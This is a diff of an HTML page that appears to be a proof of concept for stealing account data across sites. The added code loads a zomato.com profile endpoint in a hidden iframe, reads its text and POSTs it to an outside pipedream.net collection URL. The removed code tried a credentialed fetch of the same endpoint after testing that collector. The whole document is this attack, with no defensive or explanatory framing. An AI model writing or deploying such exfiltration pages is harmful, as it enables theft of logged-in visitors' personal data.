@@ -3,33 +3,37 @@
 <body>
 <h1>Loading...</h1>
 <div id="status"></div>
+
+<!-- Load the API in an iframe -->
+<iframe id="dataFrame" 
+        src="https://www.zomato.com/webroutes/getPage?page_url=/profile" 
+        style="display:none;">
+</iframe>
+
 <script>
 function log(msg) {
     document.getElementById('status').innerHTML += msg + '<br>';
 }
 
-log('Step 1: Testing RequestBin...');
+log('Attempting to load data...');
 
-// Test RequestBin first
-fetch('https://eomfuajl79ed6za.m.pipedream.net', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({test: 'hello'})
-})
-.then(() => {
-    log('Step 1: RequestBin works! ✓');
-    log('Step 2: Fetching zomato.com API...');
-    
-    return fetch('https://www.zomato.com/webroutes/getPage?page_url=/profile', {
-        credentials: 'include'
-    });
-})
-.then(response => {
-    log('Step 2: Got response: ' + response.status);
-})
-.catch(err => {
-    log('ERROR at some step: ' + err.message);
-});
+// Try to read iframe content
+document.getElementById('dataFrame').onload = function() {
+    try {
+        const iframeDoc = this.contentDocument || this.contentWindow.document;
+        const data = iframeDoc.body.innerText;
+        
+        log('Got data! Sending...');
+        
+        fetch('https://eomfuajl79ed6za.m.pipedream.net/', {
+            method: 'POST',
+            body: data
+        }).then(() => log('Sent! ✓'));
+        
+    } catch(e) {
+        log('Error reading iframe: ' + e.message);
+    }
+};
 </script>
 </body>
 </html>
